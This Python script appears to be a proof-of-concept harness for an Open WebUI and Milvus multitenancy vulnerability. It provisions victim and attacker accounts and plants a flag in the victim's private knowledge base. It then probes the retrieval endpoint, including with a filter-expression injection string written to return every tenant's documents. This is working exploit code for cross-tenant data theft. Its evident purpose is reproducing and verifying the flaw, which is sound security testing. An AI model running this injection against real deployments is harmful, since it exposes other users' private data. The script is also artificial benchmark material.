#!/usr/bin/env python3
"""REAL-APP orchestration/oracle for open-webui-cve-2026-54019.

Drives the REAL Open WebUI (official ghcr image) + REAL Milvus multitenancy over
EXTERNAL HTTP. NO source is lifted -- Open WebUI's own retrieval route,
filter_accessible_collections ACL and milvus_multitenancy sink run inside the
container. This script only speaks the public REST API.

Per version it:
  1. signs up an admin bootstrap user (Open WebUI makes the FIRST signup admin),
     then a VICTIM and an ATTACKER (both DEFAULT_USER_ROLE=user, non-admin);
  2. as VICTIM: creates a PRIVATE knowledge base, uploads a doc whose chunk =
     ${PCB_FLAG}, adds it to the KB (embedded into Milvus KNOWLEDGE_COLLECTION
     under resource_id = KB id), and confirms it is searchable by the victim;
  3. as ATTACKER runs three probes against POST /api/v1/retrieval/query/collection:
       baseline : attacker's OWN empty KB           -> never leaks the flag
       original : collection_names=[victim_kb_id]    (CVE-2026-44560 direct ref)
       bypass   : collection_names=[<milvus injection>] (CVE-2026-54019 residual)

Detection = ${PCB_FLAG} substring present in the attacker's returned documents.

Usage:
  PCB_FLAG=<tok> python3 orchestrate.py --base http://127.0.0.1:39581 --version v1
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time
import uuid

import requests

FLAG = os.environ.get("PCB_FLAG") or ("PCBFLAG_" + uuid.uuid4().hex)

# CVE-2026-54019 residual: closes the single-quoted resource_id literal in the
# unescaped Milvus expr  f"resource_id == '{resource_id}'"  and injects a
# tautology so the search returns every tenant's chunk in KNOWLEDGE_COLLECTION.
INJECTION = "x' or resource_id != '' or resource_id == 'x"

FLAG_DOC = (
    "CONFIDENTIAL Q3 board finance memo -- quarterly financials, private.\n"
    f"Access key: {FLAG}\n"
)


class Client:
    def __init__(self, base: str):
        self.base = base.rstrip("/")
        self.s = requests.Session()
        self.token = None

    def h(self):
        return {"Authorization": f"Bearer {self.token}"} if self.token else {}

    def signup(self, name, email, password):
        r = self.s.post(
            f"{self.base}/api/v1/auths/signup",
            json={"name": name, "email": email, "password": password},
            timeout=60,
        )
        return r

    def signin(self, email, password):
        r = self.s.post(
            f"{self.base}/api/v1/auths/signin",
            json={"email": email, "password": password},
            timeout=60,
        )
        if r.status_code == 200:
            self.token = r.json().get("token")
        return r


def bootstrap_admin(base):
    """The FIRST signup becomes admin; Open WebUI then auto-disables public signup."""
    c = Client(base)
    r = c.signup("Admin Bootstrap", "admin@pcb.local", "admin-pass-123")
    if r.status_code == 200:
        c.token = r.json().get("token")
    else:
        c.signin("admin@pcb.local", "admin-pass-123")
    if not c.token:
        raise RuntimeError(f"admin bootstrap failed: {r.status_code} {r.text[:200]}")
    return c


def admin_add_user(admin: Client, name, email, password, role="user"):
    """Admin provisions a non-admin user via POST /auths/add (signup is disabled
    after the first user). Returns a Client bearing the new user's token."""
    r = admin.s.post(
        f"{admin.base}/api/v1/auths/add",
        headers=admin.h(),
        json={"name": name, "email": email, "password": password, "role": role},
        timeout=60,
    )
    # Whether freshly created (200) or already present (EMAIL_TAKEN), sign in as
    # that user to obtain a normal session token.
    c = Client(admin.base)
    sr = c.signin(email, password)
    if not c.token:
        raise RuntimeError(
            f"add_user/signin failed for {email}: add={r.status_code} {r.text[:150]} "
            f"signin={sr.status_code} {sr.text[:150]}"
        )
    return c


def _query_collection(c: Client, collection_names, query, k=10):
    r = c.s.post(
        f"{c.base}/api/v1/retrieval/query/collection",
        headers=c.h(),
        json={"collection_names": collection_names, "query": query, "k": k},
        timeout=90,
    )
    body = r.text
    return {"http_status": r.status_code, "flag_present": FLAG in body, "response": body[:1200]}


def seed_victim(admin):
    """VICTIM creates a private KB carrying the flag; returns (victim_client, kb_id)."""
    base = admin.base
    victim = admin_add_user(admin, "Victim", "victim@pcb.local", "victim-pass-123", role="user")
    # create KB
    r = victim.s.post(
        f"{base}/api/v1/knowledge/create",
        headers=victim.h(),
        json={"name": "Victim Private Finance", "description": "private", "data": {}},
        timeout=60,
    )
    if r.status_code != 200:
        raise RuntimeError(f"KB create failed: {r.status_code} {r.text[:300]}")
    kb_id = r.json()["id"]
    # upload the flag doc as a file
    files = {"file": ("q3_finance_memo.txt", FLAG_DOC, "text/plain")}
    r = victim.s.post(f"{base}/api/v1/files/", headers=victim.h(), files=files, timeout=120)
    if r.status_code != 200:
        raise RuntimeError(f"file upload failed: {r.status_code} {r.text[:300]}")
    file_id = r.json()["id"]
    # add file to KB -> triggers process_file -> embed into Milvus (resource_id=kb_id)
    r = victim.s.post(
        f"{base}/api/v1/knowledge/{kb_id}/file/add",
        headers=victim.h(),
        json={"file_id": file_id},
        timeout=300,
    )
    if r.status_code != 200:
        raise RuntimeError(f"file/add failed: {r.status_code} {r.text[:300]}")
    return victim, kb_id


def wait_victim_searchable(victim: Client, kb_id, tries=40):
    """Confirm the flag chunk is embedded + searchable by its owner (proves the
    real Milvus store holds it before we run the cross-tenant attacker probes)."""
    for _ in range(tries):
        res = _query_collection(victim, [kb_id], "quarterly financials access key", k=10)
        if res["flag_present"]:
            return res
        time.sleep(3)
    return res


def run(base, version):
    out = {"version": version, "base": base, "flag": FLAG}
    # bootstrap admin (first signup becomes admin; needed so victim/attacker are plain users)
    admin = bootstrap_admin(base)
    victim, kb_id = seed_victim(admin)
    out["victim_kb_id"] = kb_id
    out["victim_self_read"] = wait_victim_searchable(victim, kb_id)

    attacker = admin_add_user(admin, "Attacker", "attacker@pcb.local", "attacker-pass-123", role="user")
    # attacker's own (empty) KB for the benign baseline
    r = attacker.s.post(
        f"{base}/api/v1/knowledge/create",
        headers=attacker.h(),
        json={"name": "Attacker scratch", "description": "own", "data": {}},
        timeout=60,
    )
    atk_kb = r.json().get("id") if r.status_code == 200 else None

    out["baseline_own_kb"] = _query_collection(attacker, [atk_kb] if atk_kb else [], "quarterly financials", k=10)
    out["original_direct_victim_ref"] = _query_collection(attacker, [kb_id], "quarterly financials access key", k=10)
    out["bypass_milvus_injection"] = _query_collection(attacker, [INJECTION], "quarterly financials access key", k=10)
    return out


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--version", default="v1")
    a = ap.parse_args()
    result = run(a.base, a.version)
    print(json.dumps(result, indent=2))
